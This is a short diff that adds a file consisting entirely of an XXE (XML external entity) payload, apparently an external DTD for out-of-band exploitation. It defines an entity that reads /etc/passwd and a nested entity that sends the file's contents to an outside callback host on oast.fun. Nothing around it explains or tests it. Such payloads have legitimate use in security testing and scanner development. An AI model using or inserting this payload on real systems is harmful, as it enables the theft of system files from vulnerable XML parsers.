@@ -1,0 +1,5 @@
+<!ENTITY % xxePOC SYSTEM "file:///etc/passwd">
+<!ENTITY % exfildata "<!ENTITY exfil SYSTEM
+'http://lcsogltcmnekluqqcodfry82g1lbemlrb.oast.fun/?x=%xxePOC;'>
+%exfildata;
+%exfil;
